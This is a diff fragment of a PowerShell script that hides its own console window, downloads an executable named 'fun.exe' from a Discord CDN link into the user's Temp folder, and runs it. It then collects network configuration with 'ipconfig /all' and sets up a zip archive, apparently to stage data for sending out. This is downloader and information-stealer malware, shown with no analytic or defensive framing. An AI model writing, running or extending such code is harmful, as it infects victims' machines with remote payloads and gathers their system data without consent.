@@ -7,9 +7,9 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)     
 
-Invoke-WebRequest 'https://cdn.discordapp.com/attachments/975173196103966800/1435755657705029790/fun.exe?ex=690d1f27&is=690bcda7&hm=b2aad148ae82f9f7533f919ccdbe006c76d041af5dab43587d910bf9de9d3466&' -OutFile "$env:LOCALAPPDATA\Temp\fun.exe"
-"$env:LOCALAPPDATA\Temp\fun.exe"
-Start-Sleep 1
+Invoke-WebRequest 'https://cdn.discordapp.com/attachments/975173196103966800/1435755657705029790/fun.exe?ex=690d1f27&is=690bcda7&hm=b2aad148ae82f9f7533f919ccdbe006c76d041af5dab43587d910bf9de9d3466&' -OutFile "$env:LOCALAPPDATA\Temp\fun.exe" ;Start-Sleep 1;  "$env:LOCALAPPDATA\Temp\fun.exe" 
+
+Start-Sleep 1;
 $e = "$env:LOCALAPPDATA\Temp"
 $zip = "$env:TEMP\funny_stuff_folder.zip"
 ipconfig /all | Out-File "$e\ipcfg.txt"
